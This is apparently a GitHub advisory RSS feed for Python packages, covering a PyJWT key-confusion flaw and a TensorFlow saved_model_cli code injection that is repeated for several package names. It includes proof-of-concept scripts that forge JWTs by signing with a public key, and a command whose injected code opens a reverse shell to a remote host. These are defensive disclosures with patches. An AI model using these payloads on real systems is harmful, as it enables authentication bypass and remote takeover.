<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2022-05-25T00:24:47.149Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <entry>
        <title type="html"><![CDATA[[pyjwt] Key confusion through non-blocklisted public key formats]]></title>
        <id>https://github.com/advisories/GHSA-ffqj-6fqr-9h24</id>
        <link href="https://github.com/advisories/GHSA-ffqj-6fqr-9h24"/>
        <updated>2022-05-24T22:17:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Disclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).</p>
<blockquote>
<p>PyJWT supports multiple different JWT signing algorithms. With JWT, an 
attacker submitting the JWT token can choose the used signing algorithm.</p>
<p>The PyJWT library requires that the application chooses what algorithms 
are supported. The application can specify 
"jwt.algorithms.get_default_algorithms()" to get support for all 
algorithms. They can also specify a single one of them (which is the 
usual use case if calling jwt.decode directly. However, if calling 
jwt.decode in a helper function, all algorithms might be enabled.)</p>
<p>For example, if the user chooses "none" algorithm and the JWT checker 
supports that, there will be no signature checking. This is a common 
security issue with some JWT implementations.</p>
<p>PyJWT combats this by requiring that the if the "none" algorithm is 
used, the key has to be empty. As the key is given by the application 
running the checker, attacker cannot force "none" cipher to be used.</p>
<p>Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is 
not a public key meant for asymmetric algorithm i.e. HMAC cannot be used 
if the key begins with "ssh-rsa". If HMAC is used with a public key, the 
attacker can just use the publicly known public key to sign the token 
and the checker would use the same key to verify.</p>
<p> From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. 
With ed25519, PyJWT supports public keys that start with "ssh-", for 
example "ssh-ed25519".</p>
</blockquote>
<pre><code class="language-python">import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

# Generate ed25519 private key
private_key = ed25519.Ed25519PrivateKey.generate()

# Get private key bytes as they would be stored in a file
priv_key_bytes = 
private_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, 
encryption_algorithm=serialization.NoEncryption())

# Get public key bytes as they would be stored in a file
pub_key_bytes = 
private_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)

# Making a good jwt token that should work by signing it with the 
private key
encoded_good = jwt.encode({"test": 1234}, priv_key_bytes, algorithm="EdDSA")

# Using HMAC with the public key to trick the receiver to think that the 
public key is a HMAC secret
encoded_bad = jwt.encode({"test": 1234}, pub_key_bytes, algorithm="HS256")

# Both of the jwt tokens are validated as valid
decoded_good = jwt.decode(encoded_good, pub_key_bytes, 
algorithms=jwt.algorithms.get_default_algorithms())
decoded_bad = jwt.decode(encoded_bad, pub_key_bytes, 
algorithms=jwt.algorithms.get_default_algorithms())

if decoded_good == decoded_bad:
 &nbsp;&nbsp;&nbsp; print("POC Successfull")

# Of course the receiver should specify ed25519 algorithm to be used if 
they specify ed25519 public key. However, if other algorithms are used, 
the POC does not work
# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py
#
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; invalid_strings = [
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b"-----BEGIN PUBLIC KEY-----",
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b"-----BEGIN CERTIFICATE-----",
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b"-----BEGIN RSA PUBLIC KEY-----",
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b"ssh-rsa",
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ]
#
# However, OKPAlgorithm (ed25519) accepts the following in 
jwt/algorithms.py:
#
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if "-----BEGIN PUBLIC" in str_key:
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return load_pem_public_key(key)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if "-----BEGIN PRIVATE" in str_key:
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return load_pem_private_key(key, password=None)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if str_key[0:4] == "ssh-":
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return load_ssh_public_key(key)
#
# These should most likely made to match each other to prevent this behavior
</code></pre>
<pre><code class="language-python">import jwt

#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem
#openssl ec -in ec256-key-priv.pem -pubout &gt; ec256-key-pub.pem
#ssh-keygen -y -f ec256-key-priv.pem &gt; ec256-key-ssh.pub

priv_key_bytes = b"""-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49
AwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk
Ak3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
-----END EC PRIVATE KEY-----"""

pub_key_bytes = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL
Zr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
-----END PUBLIC KEY-----"""

ssh_key_bytes = b"""ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc="""

# Making a good jwt token that should work by signing it with the private key
encoded_good = jwt.encode({"test": 1234}, priv_key_bytes, algorithm="ES256")

# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret
encoded_bad = jwt.encode({"test": 1234}, ssh_key_bytes, algorithm="HS256")

# Both of the jwt tokens are validated as valid
decoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())
decoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())

if decoded_good == decoded_bad:
    print("POC Successfull")
else:
    print("POC Failed")
</code></pre>
<blockquote>
<p>The issue is not that big as 
algorithms=jwt.algorithms.get_default_algorithms() has to be used. 
However, with quick googling, this seems to be used in some cases at 
least in some minor projects.</p>
</blockquote>
<h3 id="patches">Patches</h3>
<p>Users should upgrade to v2.4.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Always be explicit with the algorithms that are accepted and expected when decoding.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/jpadilla/pyjwt">https://github.com/jpadilla/pyjwt</a></li>
<li>Email Jos√© Padilla: pyjwt at jpadilla dot com</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29217">https://nvd.nist.gov/vuln/detail/CVE-2022-29217</a></li>
<li><a href="https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc">https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc</a></li>
<li><a href="https://github.com/jpadilla/pyjwt/releases/tag/2.4.0">https://github.com/jpadilla/pyjwt/releases/tag/2.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-ffqj-6fqr-9h24">https://github.com/advisories/GHSA-ffqj-6fqr-9h24</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffqj-6fqr-9h24</uri>
        </author>
        <published>2022-05-24T22:17:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-gpu] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow-cpu] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
--dir ./ --tag_set serve --signature_def serving_default
</code></pre>
<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
<pre><code class="language-python">def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
</code></pre>
<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-75c9-jrh4-79mc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29216">https://nvd.nist.gov/vuln/detail/CVE-2022-29216</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4">https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2">https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1">https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0</a></li>
<li><a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-75c9-jrh4-79mc</uri>
        </author>
        <published>2022-05-24T22:16:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] Code injection in `saved_model_cli`]]></title>
        <id>https://github.com/advisories/GHSA-75c9-jrh4-79mc</id>
        <link href="https://github.com/advisories/GHSA-75c9-jrh4-79mc"/>
        <updated>2022-05-24T22:16:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
<pre><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
--tag_set serve --signature_def serving_default
</code></pre>
<p>This can be used to open a reverse shell                                      </p>
<pre><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
